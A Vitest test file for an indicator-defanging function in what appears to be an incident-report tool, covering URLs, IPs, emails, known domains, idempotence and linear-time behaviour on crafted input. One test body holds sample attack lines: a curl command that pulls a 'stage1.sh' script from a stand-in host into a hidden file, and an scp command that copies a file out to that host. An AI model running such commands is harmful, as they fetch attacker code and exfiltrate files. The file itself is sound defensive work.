import { describe, it, expect } from "vitest";
import { defangIndicators } from "../../src/reports/defang.js";
import { refangIocValue } from "../../src/analysis/iocValue.js";

describe("defangIndicators", () => {
  it("defangs the scheme and host of a URL", () => {
    expect(defangIndicators("see http://evil.example/stage1.sh for details")).toBe(
      "see hxxp://evil[.]example/stage1.sh for details",
    );
    expect(defangIndicators("https://a.b.co.uk/x")).toBe("hxxps://a[.]b[.]co[.]uk/x");
  });

  it("leaves the path, query and fragment of a URL untouched", () => {
    // Mirrors iocValue.authorityEnd: only the part a click acts on is neutralised. Rewriting the
    // path would change a string that correlation and retrieval depend on matching exactly.
    expect(defangIndicators("http://host.example/a.b/c?q=x.y#z.w")).toBe(
      "hxxp://host[.]example/a.b/c?q=x.y#z.w",
    );
  });

  it("defangs a bare IPv4 address", () => {
    expect(defangIndicators("beacon to 203.0.113.10 observed")).toBe("beacon to 203[.]0[.]113[.]10 observed");
  });

  it("defangs an IPv4 host inside a URL exactly once", () => {
    expect(defangIndicators("http://203.0.113.10/stage1.sh")).toBe("hxxp://203[.]0[.]113[.]10/stage1.sh");
  });

  it("defangs an email address", () => {
    expect(defangIndicators("from root@203.0.113.10 and a@b.example")).toBe(
      "from root[@]203[.]0[.]113[.]10 and a[@]b[.]example",
    );
  });

  it("always defangs a www host, which GFM autolinks on sight", () => {
    expect(defangIndicators("beaconing to www.evil.com daily")).toBe("beaconing to www[.]evil[.]com daily");
  });

  it("defangs a bare hostname the case records as a domain IOC", () => {
    expect(defangIndicators("callback to evil.test observed", ["evil.test"])).toBe(
      "callback to evil[.]test observed",
    );
  });

  it("does not guess at dotted tokens the case never called domains", () => {
    // A forensic report is full of filenames shaped exactly like a domain with a two-letter TLD.
    // Mangling them in a deliverable costs more than leaving an inert, unlinked hostname fanged.
    const text = "System.Net.WebClient wrote vitest.config.ts and History.db to disk";
    expect(defangIndicators(text)).toBe(text);
  });

  it("leaves ordinary prose, filenames and version strings alone", () => {
    const prose = "Version 0.36.0 wrote report.md and report.html at 10.5 MB/s.";
    expect(defangIndicators(prose)).toBe(prose);
  });

  it("is idempotent — already-defanged text is not defanged again", () => {
    const once = defangIndicators("http://evil.example/x and 203.0.113.10");
    expect(defangIndicators(once)).toBe(once);
  });

  it("round-trips back to the live indicator via refangIocValue", () => {
    // Defanging is a presentation of the indicator, not a different one. An analyst who copies a
    // value out of the report must be able to get the real one back.
    expect(refangIocValue("url", defangIndicators("http://evil.example/x"))).toBe("http://evil.example/x");
    expect(refangIocValue("ip", defangIndicators("203.0.113.10"))).toBe("203.0.113.10");
  });

  it("defangs every indicator in a multi-line report body", () => {
    const body = [
      "| i001 | url | http://203.0.113.10/stage1.sh |",
      "curl -s http://203.0.113.10/stage1.sh -o /tmp/.x",
      "scp file user@203.0.113.10:/tmp/",
    ].join("\n");
    const out = defangIndicators(body);
    expect(out).not.toMatch(/http:\/\//);
    expect(out.match(/hxxp:\/\//g)).toHaveLength(2);
    expect(out).toContain("user[@]203[.]0[.]113[.]10");
  });
});

describe("defangIndicators runs in linear time on adversarial text (#1907)", () => {
  // The pass is synchronous and runs over every event and finding description during an export,
  // so a crafted description must not stall the single-threaded server.
  const SIZE = 200_000;
  const shapes: Array<[string, string]> = [
    ["hyphen run", "a-".repeat(SIZE / 2)],
    ["plus run", "a+".repeat(SIZE / 2)],
    ["percent run", "a%".repeat(SIZE / 2)],
    ["dot run", "a.".repeat(SIZE / 2)],
    ["email-ish local part", "a.".repeat(SIZE / 2) + "!"],
    ["digit-dot run", "1.".repeat(SIZE / 2)],
    ["dash labels", "a.--".repeat(SIZE / 4)],
    ["underscore run", "a_".repeat(SIZE / 2)],
    ["URL with a dot run", "http://a" + ".".repeat(SIZE) + "x"],
  ];
  it.each(shapes)("%s: 200 KB finishes in well under a second", (_name, text) => {
    const t0 = performance.now();
    defangIndicators(text, ["evil.example"]);
    expect(performance.now() - t0).toBeLessThan(1000);
  });

  it("still defangs an indicator that follows a long run", () => {
    const out = defangIndicators(`${"a-".repeat(50_000)} beacon to 203.0.113.10 and http://evil.example/x`);
    expect(out.endsWith("beacon to 203[.]0[.]113[.]10 and hxxp://evil[.]example/x")).toBe(true);
  });

  it("defangs the domain of an email whose local part is a long hyphenated run", () => {
    expect(defangIndicators(`${"a-".repeat(200)}a@evil.example`)).toBe(
      `${"a-".repeat(200)}a[@]evil[.]example`,
    );
  });
});

describe("defangIndicators defangs known domains with underscores or wrapper characters (#1909)", () => {
  it("defangs a known domain whose label holds an underscore", () => {
    expect(defangIndicators("c2_node.evil.example.net", ["c2_node.evil.example.net"])).toBe(
      "c2_node[.]evil[.]example[.]net",
    );
    expect(defangIndicators("beacon to c2_node.evil.example.net.", ["C2_node.evil.example.net"])).toBe(
      "beacon to c2_node[.]evil[.]example[.]net.",
    );
  });

  it("defangs a known domain behind a leading junk character", () => {
    expect(defangIndicators("-c2_node.evil.example.net", ["c2_node.evil.example.net"])).toBe(
      "-c2_node[.]evil[.]example[.]net",
    );
    expect(defangIndicators("(%evil.example.net)", ["evil.example.net"])).toBe("(%evil[.]example[.]net)");
  });

  it("defangs the live core of a wildcard or root-dotted domain IOC", () => {
    expect(defangIndicators("seen evil.example.net today", ["*.evil.example.net"])).toBe(
      "seen evil[.]example[.]net today",
    );
    expect(defangIndicators("seen evil.example.net today", ["evil.example.net."])).toBe(
      "seen evil[.]example[.]net today",
    );
    expect(defangIndicators("_sip._tcp.evil.example", ["_sip._tcp.evil.example"])).toBe(
      "_sip[.]_tcp[.]evil[.]example",
    );
  });

  it("defangs an email whose domain holds an underscore", () => {
    expect(defangIndicators("from x@c2_node.evil.example")).toBe("from x[@]c2_node[.]evil[.]example");
  });

  it("defangs a known domain or a URL inside a Markdown underscore wrapper", () => {
    expect(defangIndicators("_evil.example_", ["evil.example"])).toBe("_evil[.]example_");
    expect(defangIndicators("__evil.example__", ["evil.example"])).toBe("__evil[.]example__");
    expect(defangIndicators("_http://evil.example/x_")).toBe("_hxxp://evil[.]example/x_");
    expect(defangIndicators("_www.evil.example_")).toBe("_www[.]evil[.]example_");
  });

  it("strips a long run of wrapper characters from a known value in linear time", () => {
    const t0 = performance.now();
    defangIndicators("evil.example", ["a" + "%".repeat(200_000) + "a"]);
    expect(performance.now() - t0).toBeLessThan(1000);
  });

  it("still leaves underscore filenames the case never called domains alone", () => {
    const text = "dropped my_file.txt and run_me.ps1";
    expect(defangIndicators(text)).toBe(text);
  });
});
